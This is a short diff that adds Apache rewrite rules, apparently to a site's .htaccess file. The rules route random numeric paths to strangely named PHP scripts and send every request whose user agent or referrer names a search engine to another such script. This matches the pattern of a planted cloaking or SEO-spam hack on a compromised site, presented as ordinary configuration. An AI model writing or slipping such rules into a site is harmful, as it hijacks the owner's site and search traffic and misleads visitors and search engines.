@@ -1,0 +1,14 @@
+RewriteEngine on
+RewriteRule ^4679978487/(.*)$ journals-boathouse.php [QSA,L]
+
+RewriteEngine on
+RewriteRule ^7289804131/(.*)$ chlorophyll-complicator.php [QSA,L]
+
+RewriteEngine On
+
+RewriteCond %{ENV:REDIRECT_STATUS} 200
+RewriteRule ^ - [L]
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+RewriteRule ^(.*)$ imaginably-carmel.php?$1 [L]
+
